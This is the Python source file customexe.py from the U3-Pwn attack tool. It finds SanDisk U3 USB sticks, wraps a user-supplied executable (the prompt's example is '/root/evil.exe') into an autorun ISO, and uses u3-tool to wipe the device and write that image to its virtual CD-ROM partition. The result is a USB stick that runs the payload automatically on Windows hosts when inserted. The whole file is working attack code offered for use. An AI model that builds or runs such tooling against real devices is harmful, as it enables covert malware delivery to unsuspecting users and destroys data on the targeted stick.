#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# customexe.py                                                                 #
#                                                                              #
# DATE                                                                         #
# 06/27/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     # 
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.6                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################

try:
    import subprocess
    import pexpect
    import time
    import os
    import sys
    import shutil
    import banner
except ImportError, error:
    print'\n[-]Failed To Import Module\n'
    print error

definepath = os.getcwd()
sys.path.append('%s/src/' % definepath)

try:
    banner.print_banner()
    print ' Detecting Device...\n'
    u3 = ['5406', '5408', '5151', '5530', '5535', '550a', '540e']
    vendorid = '0781:'
    for id in u3:
        try:
             device = subprocess.check_output("lsusb -d %s%s" %(vendorid,id),  shell=True)
             print ' Device Found:', device
        except Exception, error:
            pass


    time.sleep(2)
    banner.print_banner()
    print ' Detecting Partitions...'
    time.sleep(2)
    partitionsFile = open("/proc/partitions")
    lines = partitionsFile.readlines()[2:]

    for line in lines:
        words = [x.strip() for x in line.split()]
        minorNumber = int(words[1])
        deviceName = words[3]
        if minorNumber % 16 == 0:
                path = "/sys/class/block/" + deviceName
                if os.path.islink(path):
                        if os.path.realpath(path).find("/usb") > 0:
                                if deviceName.startswith("sd"):
                                        print "\n Partition Found: /dev/%s1" % deviceName
                                        time.sleep(2)



except Exception, error:
    print '[-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)



try:
    payload = str(raw_input('\n Please enter filepath & executerble name example(/root/evil.exe): ').strip())
    
    if payload.endswith('.exe'):
         #Rename File To LaunchU3.exe 
    	 shutil.copy(payload, 'resource/LaunchU3.exe')
    	 file = open('resource/LaunchU3.bat', 'w')
    	 file.write('LaunchU3.exe ')
    	 file.close()

    	 #Create Iso with custom exe
    	 subprocess.Popen('genisoimage -volid U3\ System -o resource/U3\ System.iso resource/', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

	 banner.print_banner()
	 if deviceName.startswith("sda"):
	    	print 'No Device Found, Returning To Menu'
		time.sleep(2)
	 else:
	 	print '\nCreating a new partition of 8058880 bytes on /dev/%s\n' % deviceName
	    	#Accepts warning that the device will be formatted
            	#WARNING: Loading a new cd image causes the whole device to be whiped. This INCLUDES the data partition.
            	#I repeat: ANY EXCISTING DATA WILL BE LOST!
            	#Are you sure you want to continue? [yn]	
            	child1 = pexpect.spawn('u3-tool -v  -p 8058880 /dev/' + deviceName) 
            	child1.sendline('y')
            	time.sleep(5)
	    	print'\nPartitioning completed on /dev/%s' % deviceName
	    	banner.print_banner()
            	print'\nInserting new iso to virtual rom partition on /dev/%s\n' % deviceName
		
            	#inserts new iso file to virtual rom devices using u3-tool
	    	subprocess.Popen('u3-tool -v -l resource/U3\ System.iso /dev/%s' % deviceName, shell=True).wait()
	    	print '\nCustom Exe Succfully injected into /dev/%s\n' % deviceName
  	    	time.sleep(2)

except Exception, error:
    print '[-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)



try:
     #Clean up left over files from iso creation
     os.remove('resource/LaunchU3.exe')
     os.remove('resource/LaunchU3.bat')
     os.system('rm resource/U3\ System.iso')
     shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')

except Exception, error:
    print '[-]Something went wrong, printing error message..'
    print error
    time.sleep(2)
    sys.exit(0)

